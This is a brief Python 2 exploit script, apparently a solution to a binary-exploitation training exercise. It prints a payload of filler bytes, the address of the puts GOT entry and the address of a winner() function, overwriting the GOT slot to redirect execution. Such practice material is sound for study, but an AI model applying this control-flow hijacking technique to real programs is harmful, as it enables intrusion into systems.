#!/usr/bin/env python
#enter 49 when prompted
# 0804a01c R_386_JUMP_SLOT   puts@GLIBC_2.0
# 0x080484cb winner()

filler = 'A' * 20
eip = '\xcb\x84\x04\x08'
#target ='BBBB'
target = '\x1c\xa0\x04\x08'
print filler + target + ' ' + eip
